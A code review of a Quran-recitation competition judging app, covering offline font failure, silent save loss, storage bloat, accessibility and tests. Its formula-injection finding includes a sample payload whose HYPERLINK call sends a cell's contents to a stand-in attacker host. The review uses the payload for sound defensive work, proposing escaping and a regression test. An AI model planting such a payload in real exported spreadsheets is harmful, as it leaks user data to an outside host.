# Tahqeeq: a ground-up code review

> Reviewed 18 August 2026 against `main` at `b856944`, on a working tree made
> byte-identical to it. Baseline: **309 tests pass, build clean.**
>
> Every claim below was measured or reproduced, not inferred. Where a fix is
> proposed, the evidence for it is quoted. Where I could not verify something,
> it says so.

## 0. The one-paragraph version

The application is in good shape structurally — no `dangerouslySetInnerHTML`,
zero TODO/FIXME markers, a real design-token system, 309 passing tests, and a
domain model (judge sections, revisions, manifests, ledger events) that is more
carefully thought out than most products this size. What it does not yet have is
**failure discipline**. The three worst problems all share one shape: a
foreseeable failure is caught and discarded, so the app keeps looking correct
while doing nothing. In a product whose entire purpose is to be the trustworthy
record of a competition, silent failure is the defect class that matters most.

Fix the seven severity-1 items and this is a product you can run an official
competition on. Everything after that is craft.

---

## 1. Severity 1 — correctness, data loss, security

### 1.1 The Mushaf dies when a third-party font CDN is unreachable

**Reproduced.** With the page JSON serving normally (`/pages/p604.json` → 200,
valid) but `static-cdn.tarteel.ai` unreachable, the entire judging surface
renders as *"The requested page could not be opened."* — one DOM node, no text.

`src/components/Mushaf.tsx:259`:

```ts
const [data, fontLoaded] = await Promise.all([
  loadPage(page),
  loadQcfPageFont(page).then(() => true),   // ← no .catch()
]);
```

`Promise.all` rejects if either input rejects. The font promise has no rejection
handler, so a CDN failure rejects the whole load and lands in
`.catch(() => setLoadError(true))` at `:276`.

The bitter part: **the fallback already exists and is unreachable.** `:796`
reads `qcfReady && word.glyph ? word.glyph : word.text`, and `hafs.18.woff2`
(86 KB Uthmani) is bundled locally. The code was written to degrade; the
coupling prevents it.

**Fix — one line:**

```ts
loadQcfPageFont(page).then(() => true).catch(() => false),
```

**Verified.** With that change and the CDN still failing: error banner gone,
`.m-line` node count 1 → 12, all three sūrahs of page 604 rendering correctly in
the local Uthmani face, `data-font-ready="false"` as designed.

This is the highest-value line of code in the review. A competition hall with
weak wifi, a corporate firewall, or a CDN incident currently means *no judging*.

**And it is worse than one page.** The service worker precaches exactly **one**
font — `QCF_DEFAULT_FONT` at `public/sw.js:24`, page 604's — while the app
requests a **per-page** font (`qcfFontAssetUrl(page)` → `p{page}.woff2`, called
per page by `Mushaf.tsx`). Font requests are served cache-first
(`sw.js` fetch handler), so offline:

- page 604 → font cached → renders
- **any of the other 603 pages** → cache miss → network → fails → §1.1 kills the page

So on paper, offline, the app judges **1 of 604 pages**. The optional full
download (`offlineMushaf.ts`, `offlineMushafAssetPairs()`) closes this — it
enumerates all 604 page/font pairs — but it is opt-in, and it is 9.3 MB of page
JSON plus 604 font files.

**Confirmed against a production build, service worker active, network genuinely
offline** — the check this review's first draft listed as not-yet-done. `npm run
build` output served over `localhost:8088`, SW allowed to install and activate,
then `Network.emulateNetworkConditions {offline: true}` and a reload:

```
SW state   : {registrations:1, controller:true, active:"activated",
              caches:{ static-app-v29: 13,
                       mushaf-pages-v1: 1,
                       mushaf-fonts-qcf-v1-3.1: 0 }}   ← zero
fonts held : ["/fonts/hafs.18.woff2", "/fonts/InterVariable.woff2"]  ← both local
offline    : shell loads, title correct, competition and roster intact
Mushaf     : {lines: 0, words: 0, errorShown: true}
```

Two things this changes. First, the QCF font cache installed **empty**: the
cross-origin precache is deliberately best-effort (`Promise.allSettled`,
`sw.js:65`), so when the CDN is unreachable *at install time* the app ships with
zero QCF fonts, and the real offline figure is **0 of 604 pages**, not 1. Second,
`hafs.18.woff2` **was cached and available the whole time** — the fallback font
was sitting in the cache while the screen said the page could not be opened.

**The deepest form of the finding: the codebase already disagrees with itself.**
Three separate places treat the QCF font as optional, all of them deliberate:

| Location | Treatment | Evidence of intent |
| --- | --- | --- |
| `sw.js:65` | `Promise.allSettled` | comment `:52` — *"so a temporary cross-origin font failure cannot prevent an otherwise usable application update from installing"* |
| `qcfFont.ts:45` | `preloadQcfPageFont` → `.catch(() => {})` | the preload path swallows it by design |
| `Mushaf.tsx:796` | `qcfReady && word.glyph ? word.glyph : word.text` | a written, tested fallback render path |
| **`Mushaf.tsx:259`** | **`Promise.all`, required** | **the one on the critical path** |

The service worker's author wrote down the assumption — *an otherwise usable
application* — and shipped an 86 KB local Uthmani face to honour it. One
`Promise.all` on the render path makes that assumption false. The one-line fix
is not a patch over a missing feature; it is making the render path agree with
the three decisions already made around it.

Compounding it: `Mushaf.tsx` never consults `navigator.onLine`, so the message a
judge sees is *"The requested page could not be opened"* whether the device is
offline, the CDN is down, or something is genuinely broken.

**Two more fixes follow from this:**

- Precache the **local** Uthmani face (`/fonts/hafs.18.woff2`, 86 KB, already in
  `STATIC_PRECACHE_URLS`' neighbourhood) as the guaranteed floor, so every page
  has a renderable font offline without the 9.3 MB download.
- Distinguish offline from broken in the error, and say which page and what to
  do — "Page 481 needs the offline Mushaf download" is actionable; the current
  string is not.

### 1.2 A failed save is silent

`src/state/store.tsx:1647`:

```ts
useEffect(() => {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
  } catch {
    /* ignore quota errors */
  }
}, [state]);
```

Nothing anywhere in `src/` surfaces a write failure — the only other mention of
quota is a second silent catch at `:1606`. Once the quota is hit, a judge marks
mistakes for the rest of a recitation and **none of it persists**, with no
indication until reload.

For an accountability product this is the worst possible failure mode: the
screen says the work is recorded and it is not.

**Fix:** treat a failed write as a first-class application state. Surface a
persistent, non-dismissible banner ("Marks are not being saved"), stop the
session from being finalizable, and offer the backup download as the escape
hatch. A `try/catch` that swallows is acceptable only where the caller can
genuinely continue; this caller cannot.

### 1.3 Ten copies of the state, one of them useful

Measured in the running app with sample data only:

| | |
| --- | --- |
| Live state (`tahqeeq.session.v1`) | 101,153 chars |
| Total localStorage for the origin | **1,249,434 chars** |
| Redundant backup keys | **9**, each 127,475 chars, all identical |

`store.tsx:1591` writes a full copy of state into nine `PRE_*_BACKUP_KEY`s on
first load after each migration. They are never pruned. localStorage is capped
at roughly **5 MB** in every major browser — and `navigator.storage.estimate()`
does *not* report that cap (it reported 154 GB here), so the app cannot detect
its own ceiling through that API.

With 8 sample participants the app already holds 1.25 MB. A 100-participant
competition with full mistake ledgers plausibly exceeds 5 MB — at which point
§1.2 fires, silently.

**Fixes, in order:** prune migration backups once the migration is confirmed
(keep at most one); move the live record to IndexedDB, which is quota-estimable
and asynchronous; keep localStorage for device preferences only.

### 1.4 Spreadsheet formula injection — a documented requirement, unimplemented

`PRODUCT_FOUNDATION.md` §10.5 states: *"All human-controlled strings must be
escaped against spreadsheet/CSV formula injection (`=`, `+`, `-`, `@`, tabs, and
line prefixes as applicable)."*

Grepping `finalResultsWorkbook.ts`, `judgeRecordsWorkbook.ts` and
`resultPackages.ts` for any escaping returns nothing. Participant name,
institution and revision reason are written straight into cells
(`finalResultsWorkbook.ts:122`, `:126`, `:237`).

**Reproduced.** Building a workbook with a participant named
`=HYPERLINK("https://evil.example/"&A1,"CLICK")` and institution `@SUM(1+1)`,
then reading the sheet back:

```
Name cell   : "=HYPERLINK(\"https://evil.example/\"&A1,\"CLICK\")"
Institution : "@SUM(1+1)"
UNESCAPED — 2 cells begin with a formula trigger
```

Excel and Google Sheets evaluate these on open. The roster is imported from
spreadsheets supplied by participating schools, so the hostile string does not
even need an insider.

**Fix:** one `escapeCell()` helper prefixing `'` to any string starting with
`= + - @ Tab CR`, applied at every workbook and CSV boundary. Add a test with
the payload above. This is perhaps 20 lines and closes a real vulnerability.

### 1.5 No error boundary anywhere

`grep -rn "componentDidCatch|ErrorBoundary|getDerivedStateFromError" src/` →
nothing.

Any render-time throw unmounts the whole tree to a white screen. This is not
hypothetical — during earlier work in this repository a single bad property read
(`Cannot read properties of undefined (reading 'ageGroup')`) blanked the entire
application. Mid-recitation, that is unrecoverable in the moment.

**Fix:** an error boundary around the judging stage and another around each
route-level view, rendering a "something broke — your marks are saved, reload"
panel plus a backup-download button. Cheap, and it converts a catastrophe into
an inconvenience.

### 1.6 The audit reason is still a `window.prompt`

`src/components/FinalResultsPanel.tsx:165`. The field that makes an official
revision accountable is collected through a browser dialog: unstyleable,
unvalidatable, no character limit, no record of what was typed if the dialog is
dismissed, and blocked outright in some embedded/WebView contexts — where
finalizing a revision then becomes impossible with no error.

It is the only `window.prompt` left in the application.

**Fix:** a required textarea in the result detail, with Finalize disabled until
it carries text. (A worked implementation exists on
`origin/claude/result-screen-redesign-erk238` at `ec58e5d` if useful.)

### 1.7 The roster import has no bounds of any kind

`roster.ts` (1,270 lines) is where untrusted data enters the product — schools
send spreadsheets, an organiser imports them. The structural validation is
decent: `normalizeRosterDraft()` coerces every field through `String()`, and
`validateRosterDraft()` enforces required fields with errors and warnings.

What is missing is **any bound at all**. Grepping the whole module for
`file.size`, `MAX`, `maxRows` or a truncating `slice(0, n)` returns nothing.
`parseRosterFile()` reads the file wholesale (`await file.arrayBuffer()`) and
parses every row into state. There is no cap on:

- file size
- row count
- individual field length

This is not primarily an attack surface — it is an accident surface. A
spreadsheet with a stray selection extending to row 50,000, or a cell holding a
pasted document, imports cleanly and lands in state, which lands in
localStorage, which hits §1.3's ceiling and fails via §1.2 — **silently**, in
the middle of setting up a competition.

**Fix:** cap the file at a few MB with a clear message, cap rows at something
defensible (500?), and truncate individual fields to a sane length at the
`normalizeRosterDraft` boundary where the `String()` coercion already happens.
Each is one line at a place the code already touches every field.

---

## 2. Severity 2 — architecture and performance

### 2.1 One context, nineteen consumers, every dispatch

`store.tsx:1655`: `const value = useMemo(() => ({ state, dispatch }), [state])`.

Because the memo depends on the whole state object, **every** dispatch produces
a new context value and re-renders all **19** components that call
`useJudging()` — including `Mushaf.tsx` (1,029 lines) and `RecordsView.tsx`
(1,240 lines). Marking one letter re-renders the results screen.

**Fix:** split into two contexts — a stable `dispatch` context and a state
context — then add selector subscriptions (`useSyncExternalStore`, or `zustand`
/ `jotai` if a dependency is acceptable) so a component re-renders only for the
slice it reads.

### 2.2 The whole state is serialized on every dispatch

Measured in-browser at the current 101 KB state:

| | |
| --- | --- |
| `JSON.stringify(state)` | 0.25 ms |
| `localStorage.setItem` | 0.92 ms |
| **Per dispatch** | **1.17 ms** |

Fine today. It scales linearly with state, and it is synchronous on the main
thread. At a realistic 100-participant competition (~1.2 MB state) that becomes
roughly **14 ms of blocking work on every mark**, on top of §2.1's re-renders —
inside the interaction budget of a judge pressing a letter while listening.

**Fix:** debounce the write (~250 ms trailing) and move it off the critical
path; with IndexedDB (§1.3) it becomes asynchronous anyway. Persist deltas
rather than the whole document if the ledger allows.

### 2.3 1.8 MB of JavaScript, including two spreadsheet libraries

```
dist/assets/exceljs.min-*.js   940.37 kB │ gzip: 271.39 kB
dist/assets/index-*.js         533.87 kB │ gzip: 154.65 kB
dist/assets/xlsx-*.js          333.02 kB │ gzip: 113.89 kB
dist/assets/index-*.css        228.39 kB │ gzip:  37.78 kB
```

`exceljs` **and** `xlsx` are both imported by the same three modules
(`finalResultsWorkbook.ts`, `judgeRecordsWorkbook.ts`, `roster.ts`). That is
1.27 MB — 385 kB gzipped — of duplicated capability.

**Fix:** pick one. `exceljs` if styled output is required; `xlsx` if not. Then
confirm both are dynamically imported so they never enter the initial bundle
(they appear to be chunked already — worth verifying they are not eagerly
pulled by the judging path, which needs neither).

### 2.4 Prototypes ship to production

`public/` contains `results-redesign-checkpoint-1.html` (50 KB),
`results-table-architecture-checkpoint.html` (22 KB), `prototypes/` (88 KB) and
`downloads/` (20 KB). Everything in `public/` is copied verbatim into `dist/`
and served. That is ~180 KB of design scratch shipped to every user, publicly
reachable.

**Fix:** move design artefacts to `docs/` (which is not served) and keep
`public/` for real runtime assets only.

### 2.5 Dead computation in `stats.ts`

`avgScore` and `avgPercent` are computed by `computeRecords()` on every Analysis
render and consumed **nowhere** — `grep` across `src/` and `scripts/` outside
`stats.ts` returns nothing.

Worth noting *why* this is good news: `avgPercent` averaged `total/totalMax`
across judge sections with different rubrics, which was never a meaningful
number. Main removed it from the UI. Only the corpse remains.

**Fix:** delete both fields and the `pctSum`/`scoreSum` accumulators.

### 2.6 The app-shell cache version is manual, and a test punishes bumping it

`public/sw.js:11`:

```js
const APP_CACHE_VERSION = "app-v29";
```

The precache *list* is generated — `scripts/pwa-precache.mjs` injects Vite's
hashed filenames into the built worker, and it is well built: it refuses to
inject if the marker is missing or duplicated (`:38`) and if the build emitted
no JS or no CSS (`:24`, `:27`). But the cache *name* those files land in is
hand-typed.

The activate handler (`:83–100`) deletes stale cache **names** — `staleStatic`,
`stalePages`, `staleFonts`, each correctly scoped by prefix so the interface
version can never invalidate the 1405H page data. What nothing does is prune
stale **entries inside the current cache**. So on a release where the version is
not bumped:

- `sw.js` bytes change (new hashes) → browser installs the new worker
- `addAll` writes the new hashed assets into `tahqeeq-static-app-v29`
- the *previous* release's hashed assets are still there, still matching no
  request, never evicted

At ~1.8 MB of JS per build (§2.3), that is roughly 1.8 MB of dead weight per
unbumped release, on the device of a judge who may be on a phone.

**And the test suite makes the bump costly.** `scripts/pwa-shell.test.mjs:177`:

```js
assert.match(workerSource, /const APP_CACHE_VERSION = "app-v29"/);
```

The literal is pinned. Bumping to `app-v30` — the correct action — turns the
suite red, so the incentive under time pressure runs backwards. This is §4.1's
source-text-assertion problem with an operational cost attached rather than just
a refactoring cost, and it is the clearest single argument in the review for
fixing that test style.

**Fix.** `collectBuildPrecacheUrls()` already has every hashed filename in hand
at `:31`. Derive the version from a hash of that list and inject it the same way
the URL list is injected; the bump becomes automatic and unforgettable. The test
then asserts the behaviour that actually matters — *the cache name changes when
the shell changes* — instead of a string that has to be edited in two files.

### 2.7 The delivery layer sends no security headers

The entire server side is 21 lines (`worker/index.js`): pass the request to the
`ASSETS` binding, and on a GET 404 that accepts HTML, serve `/index.html` as the
SPA shell. That is the right shape and it is correctly guarded on both method
and `accept`.

What it does not do is set a single response header. There is no CSP, no
`X-Content-Type-Options`, no `Referrer-Policy`, no `Permissions-Policy`, and no
`_headers` file supplying them either (checked: none in `public/` or
`dist/client/`).

No CSP is defence-in-depth rather than an active hole — there is no
`dangerouslySetInnerHTML` anywhere and no user-supplied HTML path (§0). The
reason to add one here is that it is unusually cheap: **the application
references exactly one external origin**, `static-cdn.tarteel.ai`, in the whole
of `src/`, `public/` and `index.html`. So the policy is close to
`default-src 'self'` plus one `font-src` entry, and it doubles as executable
documentation of that dependency — the same dependency §1.1 is about. A CSP that
names the QCF CDN makes the coupling visible in a place a reviewer will look.

`Referrer-Policy: no-referrer` and `nosniff` are two lines and have no cost at
all.

---

## 3. Severity 3 — design system, UI, UX

### 3.1 The design grammar has regressed, measurably

`DESIGN_GRAMMAR.md` rule 8 fixes the type scale at **12 / 14 / 15 / 17 / 21 /
27** and radii at **8 / 12 / 20**, and explicitly warns: *"The half-pixel sizes
these replaced came from nudging individual screens until each looked right,
which is exactly why no two agreed."*

Measured across all four stylesheets:

| | |
| --- | --- |
| `font-size` declarations | 605 |
| Distinct values | **56** |
| Px-valued declarations **off the fixed scale** | **373 of 496 (75%)** |
| Distinct px sizes | 32 — including 8.5, 9.5, 10.5, 11.5, **12.25**, 12.5, 13.5, 14.5 |
| Distinct `border-radius` values | **33** — every integer 1–12 |
| Distinct hex colour literals | **78**, despite a token system |
| `global.css` | **11,976 lines** (12,584 total CSS) |

The half-pixel nudging the grammar was written to stop has fully returned.

**Fix:** this needs a mechanical guard, not resolve. Add a stylelint rule (or a
test in the existing `scripts/*.test.mjs` style, which the repo already does
well) that fails on any `font-size` outside the six tokens and any
`border-radius` outside the three. Then convert in one pass. Without the guard
it will regress a third time.

### 3.2 The 44px rule is broken on the live judging screen

Rule 10: *"A control pressed during a live recitation is at least 44px."*

Measured on the landing/judging view: **10 of 11 controls are under 44px.** Page
navigation is **28px** (`next page`, `previous page`, `Pages 604. Jump to
page.`), the error `Retry` is 30px. On Results, 24 of 29 are under 44px, though
none below 32px.

The rule exists because a judge is listening to a person recite and cannot also
be aiming. The screen where it matters most is the screen that breaks it.

**§3.7 explains why, and it is not neglect.**

### 3.3 Document structure

The judging view has **no `<h1>`** — the outline starts at `<h2>Next reciter</h2>`
— and exposes only 2 landmarks. Results is better (one `h1`, correct h1→h2→h3→h4
nesting, 3 landmarks, 2 live regions).

### 3.4 The Results screen is 3,296 px tall

Most of it is the stored-judge-results list below the table (32 sessions). The
useful content is the first screen; everything after is a scroll tax on a
surface used under time pressure.

### 3.5 Standings are computed and barely surfaced

`placeFinalizedResults()` groups by age group and participant category, sorts by
ratio and resolves ties. Its entire output reaches the UI as
`{placed.place}` inside a `<small>` in `ParticipantResultDetail.tsx:302`, plus
the workbook. There is still no view that ranks a division on screen, though
winners-by-division is sheet 2 of the export `PRODUCT_FOUNDATION.md` §10.5
specifies.

*Credit where due:* main's current Results table (Participant / Total / State
with a segmented status filter) is a genuine improvement on what preceded it and
independently reached a similar conclusion to the redesign work on the side
branch. Adding Place and division grouping is a small step from here, not a
rewrite.

### 3.6 Ten dialogs, four different modal implementations

The app has ten modal surfaces. Three are native `<dialog>` driven by
`showModal()` — `FinishDialog.tsx:207`, `SettingsGuide.tsx:27`,
`OfflineMushafPrompt.tsx:68`. Those are correct for free: the browser moves
focus in, traps Tab, closes on Escape and makes everything behind the top layer
inert. The other seven are hand-rolled `<div role="dialog" aria-modal="true">`,
and each one re-implements a different subset of that behaviour:

| Surface | Focus moves in | Escape closes | Tab trapped | Focus restored | Backdrop click |
| --- | --- | --- | --- | --- | --- |
| `FinishDialog` / `SettingsGuide` / `OfflineMushafPrompt` (native) | yes | yes | yes | yes | — |
| `DragMenu.tsx:301` | yes `:117` | yes `:121` | yes `:142` | — | — |
| `MoreActionsPopover.tsx:156` | yes `:99` | yes `:83` | no | yes `:75` | — |
| `StartDialog.tsx:335` | **no** | handler at `:327`, never fires | no | no | yes `:330` |
| `ReopenSessionDialog.tsx:24` | yes `:17` | **no handler** | no | no | no |
| `ParticipantRosterEditor.tsx:593` (template) | **no** | **no handler** | no | no | no |
| `ParticipantRosterEditor.tsx:636` (paste) | `autoFocus` `:638` | **no handler** | no | no | no |
| `ParticipantRosterEditor.tsx:654` (review) | **no** | **no handler** | no | no | no |

`DragMenu` is the best of them and is genuinely well built — it traps Tab,
handles Escape, and adds arrow-key navigation across categories and units. It is
also proof that the knowledge exists in this codebase; it just was not shared.

**Measured, driving the app with real keyboard events** (`Input.dispatchKeyEvent`
over CDP, not synthetic `dispatchEvent` — a synthetic event on `document` would
never reach a React `onKeyDown` regardless, and would have proved nothing).
Opening the question board from the live judging screen:

```
open board       : {open:true, activeInModal:false, active:"BODY",
                    bgInert:false, bgAriaHidden:false,
                    focusOutsideModal:11, scrollLocked:true}
real Escape      : {stillOpen:true}
4 real Tabs      : {active:"BUTTON:More actions and view controls", inModal:false}
```

Three separate defects, in the order they bite:

1. **Focus never enters the dialog.** `document.activeElement` is still `<body>`
   after the board opens. A keyboard or screen-reader user is given no
   indication that anything happened.
2. **Escape does not close it — but the handler is correct.** `StartDialog.tsx:326`
   puts `onKeyDown` on `.dialog-backdrop`. React synthetic events propagate from
   the event target, and the target is `<body>`, which is outside that subtree,
   so the handler never runs. Focusing any control inside the dialog and
   pressing Escape closes it immediately:

   ```
   focus .dialog-close : {inModal:true}
   real Escape         : {stillOpen:false}
   ```

   So defect 2 is not a second bug. It is defect 1, and one `.focus()` call on
   open fixes both.
3. **Tab walks out of the modal into the page behind it.** Four Tab presses
   land on *More actions and view controls* — a button behind an 8px-blurred
   backdrop that the user cannot see. **Eleven** background controls stay
   focusable while the dialog is open (the dialog itself holds 22). Nothing is
   `inert`; nothing is `aria-hidden`. To a screen reader the whole page is still
   there, and `aria-modal="true"` is an assertion the DOM does not honour.

What already works and should be kept: `global.css:7694`
(`html:has(.dialog-backdrop) { overflow: hidden }`) locks background scroll for
every backdrop dialog at once — confirmed `scrollLocked:true` above. That is the
right instinct, applied in the right place; it is the rest of the modal contract
that never followed it there.

**The fix is one component, not seven.** A `<Modal>` wrapper — or converting the
seven to native `<dialog>` + `showModal()`, which is strictly less code — makes
focus entry, focus trap, Escape, focus restore and background inertness
structural rather than per-site. `DragMenu`'s arrow-key behaviour stays as its
own layer on top; `MoreActionsPopover`'s focus restore (`:75`) is the pattern
the wrapper should adopt for all of them. The native route also deletes the
`z-index: 80` stacking guess at `global.css:6384`, since the top layer has no
z-index to compete with.

This matters beyond compliance. The question board is on the path of every
single recitation, and `ReopenSessionDialog` gates an audited correction to a
finalized result — the two moments where a judge is least able to reach for a
mouse.
### 3.7 The 44px rule is implemented correctly — behind a query no tablet matches

Measured across four viewports, driving the app at each (device metrics
emulated, touch emulation on for the first three):

| Device | `pointer: coarse` | Nav button | Controls under 44px |
| --- | --- | --- | --- |
| iPhone 13, 390×844 | true | **44×44** | 2 of 10 (both 40px) |
| iPad portrait, 820×1180 | true | **28×28** | 10 of 10 |
| iPad landscape, 1180×820 | true | **28×28** | 10 of 10 |
| Laptop, 1400×900 | false | 28×28 | 9 of 10 |

The phone is the best-behaved screen in the application. Every tablet is the
worst. That is backwards, and a tablet on a desk is the likeliest judging
device there is.

The cause is one media condition, `global.css:9871`:

```css
@media (max-width: 600px),
  (min-width: 601px) and (max-width: 900px) and (max-device-width: 600px) and
    (pointer: coarse) and (orientation: portrait) {
```

and the comment sitting inside it at `:10021` quotes rule 10's own reasoning:

> *"Keep the approved compact navigation surfaces while making the actual
> previous/page/next controls large enough to hit without aiming."*

The work is done. `.page-nav-btn` becomes 44×44 with a `::before` inset by 8px
so the *visible* pill stays 28px while the *hit area* is 44px — which is exactly
the right technique, and better than simply making the button bigger. It is then
gated behind a width cap that excludes every device it was written for.

Both branches of the query cap device width at 600px. The second branch reads
like an attempt to catch tablets — it asks for `pointer: coarse` — but
`(max-device-width: 600px)` vetoes first, and no tablet has a device width at or
under 600px. So the branch can only fire on a phone the *first* branch has
already matched, which makes it close to dead code.

**The proof that the condition is asking the wrong question:** `pointer: coarse`
evaluates to **true** on both iPad cases above. The browser is telling the
stylesheet that this is a touch device, and the width caps overrule it.

**Fix.** The question rule 10 asks is *"is a finger doing this?"*, and
`(pointer: coarse)` already answers it. Split the query so touch sizing keys off
the pointer type alone and layout keys off width:

```css
@media (pointer: coarse) { /* 44px targets */ }
@media (max-width: 600px) { /* phone layout */ }
```

That is a smaller stylesheet than what is there now, and it turns three of the
four rows above green without touching a single component.

*Worth crediting alongside it:* at every one of those four widths the document
had **no horizontal overflow**, and the two places where content genuinely
exceeds a phone's width — the results ledger table (scrollWidth 440 in a 342px
box) and the status-filter row (390 in 334) — are both correctly wrapped in
`overflow-x: auto` containers rather than being allowed to push the page. The
responsive layout work is sound. It is only the target sizing that is gated
wrong.

---

## 4. Severity 4 — tests and process

### 4.1 42% of assertions test how the code is written, not what it does

| | |
| --- | --- |
| Total assertions | 1,647 |
| `assert.match` + `assert.doesNotMatch` (regex over source text) | **697 (42%)** |
| Test files that `readFileSync` application source | **22 of 30** |

These pin implementation strings — class names, JSX fragments, literal copy.
They break on any refactor that preserves behaviour, and they pass on any change
that breaks behaviour while keeping the string. During earlier work here, a
redesign that was functionally correct failed tests solely because
`results-status-card` had become `results-row`.

They are not worthless — they are cheap regression guards for a UI with no
component-test harness — but they are the wrong tool for 42% of the suite.

**Fix:** add a real component test runner (Vitest + Testing Library) and migrate
the source-text assertions to behavioural ones — render the component, assert on
roles and text the user sees. Keep source-text assertions only for genuine
invariants that have no runtime surface (e.g. "no `window.prompt` anywhere").

### 4.2 No end-to-end or visual coverage

There is no test that boots the app and judges a recitation. Every severity-1
finding in §1 would have been caught by one smoke test that loads the app with
the font CDN blocked and asserts the Mushaf renders.

**Fix:** a small Playwright suite (Chromium is already available in CI images
here) covering: app boots → sample competition loads → Mushaf renders → mark a
mistake → finish → result appears in Review → export produces a workbook. Run it
with the CDN blocked as a second matrix entry.

### 4.3 What is already good, and should not be lost

- **Zero** `TODO`/`FIXME`/`HACK` markers in 22,390 lines of TS/TSX.
- No `dangerouslySetInnerHTML` or `innerHTML` anywhere.
- The migration/backup discipline is thoughtful (§1.3 is about pruning, not
  about the idea).
- `DESIGN_GRAMMAR.md` and the `docs/*-study.html` convention are a genuinely
  unusual asset — measured design decisions with their evidence attached.
- The domain model (judge sections, revisions, `fnv1a` manifests, ledger events,
  question evidence) is serious work.

---

## 5. Suggested order

Sequenced by risk retired per hour spent.

| # | Change | Size | Retires |
| --- | --- | --- | --- |
| 1 | `.catch(() => false)` on the font promise (§1.1) | 1 line | Total loss of the judging screen offline |
| 2 | `escapeCell()` at every workbook boundary (§1.4) | ~20 lines + test | A live vulnerability against a documented requirement |
| 3 | Error boundaries around stage and views (§1.5) | ~60 lines | White-screen-mid-competition |
| 4 | Surface failed saves (§1.2) | ~40 lines | Silent loss of a judge's work |
| 5 | Prune migration backups (§1.3, part 1) | ~20 lines | 90% of storage pressure |
| 6 | Replace `window.prompt` (§1.6) | ~40 lines | Unfinalizable revisions in WebViews |
| 6a | Bound the roster import — size, rows, field length (§1.7) | ~10 lines | Unbounded state from an ordinary bad spreadsheet |
| 7 | Precache the local Uthmani face; name offline in the error (§1.1) | ~15 lines | Judging 603 of 604 pages offline |
| 8 | Drop one spreadsheet library (§2.3) | dependency work | ~385 kB gzipped |
| 9 | Stylelint guard + one conversion pass (§3.1) | mechanical | Permanent grammar drift |
| 9a | Key touch sizing off `(pointer: coarse)`, not width (§3.7) | ~4 lines, net smaller | 44px targets on every tablet — the likeliest judging device |
| 9b | One `<Modal>` wrapper for the seven hand-rolled dialogs (§3.6) | ~60 lines, 7 call sites | Keyboard users stranded in every modal on the recitation path |
| 9c | Derive the SW cache version from the asset hashes (§2.6) | ~10 lines | Dead cache accumulating on judges' devices, and a test that discourages the fix |
| 9d | Security headers in the Worker; CSP naming the one external origin (§2.7) | ~15 lines | No active hole — defence-in-depth, plus executable documentation of §1.1's dependency |
| 10 | Split the context, debounce persistence (§2.1, §2.2) | moderate | Frame drops at real roster sizes |
| 11 | Playwright smoke suite (§4.2) | moderate | The whole class of §1 defects |
| 12 | IndexedDB for the live record (§1.3, part 2) | large | The 5 MB ceiling |
| 13 | Migrate source-text assertions (§4.1) | large, incremental | A test suite that blocks refactoring |

Items 1–7 are a day's work between them and are the difference between "a good
app" and "an app you would trust with an official competition."

---

## 6. Method, and what this review does not cover

**Method.** Working tree pinned byte-identical to `main`; 309 tests and a clean
build established as the baseline first. Static measurements by script over the
real source. Runtime measurements by driving the built app in headless Chromium
over CDP — storage sizes, per-dispatch timing, hit-target geometry, accessibility
tree, keyboard behaviour driven through `Input.dispatchKeyEvent` rather than
synthetic events, and screenshots at 1400×900. The font-CDN fix (§1.1) and the formula
injection (§1.4) were each reproduced and, in §1.1's case, the fix verified
before being reverted; the tree is clean.

**Not covered, and why:**

- **Server-side.** Nearly none, and now covered rather than skipped: the whole
  of it is `worker/index.js`, 21 lines of SPA fallback over Cloudflare's
  `ASSETS` binding, reviewed in §2.7. Everything else that "backend" usually
  means — the state store, persistence, the service worker and the export
  pipeline — lives in the client and is covered by §1, §2.2 and §2.6.
- ~~**Offline behaviour under a real Service Worker.**~~ **Now covered** — see
  §1.1. Confirmed against a production build with the SW installed and activated
  and the network emulated offline; the result was worse than the static
  reading predicted (0 of 604 pages, not 1).
- **Cross-browser.** Everything was measured in Chromium. Safari's localStorage
  behaviour under memory pressure is materially different and matters for iPad
  judging.
- **Real-device touch testing.** Hit targets were measured geometrically across
  four emulated viewports with touch emulation on (§3.7), not used with a thumb.
  The geometry is conclusive; how 40px feels mid-recitation is not.
- **The Arabic typography itself.** Whether the QCF fallback preserves correct
  Uthmani orthography at every page is a question for someone qualified to judge
  it; §1.1 only establishes that the fallback renders.
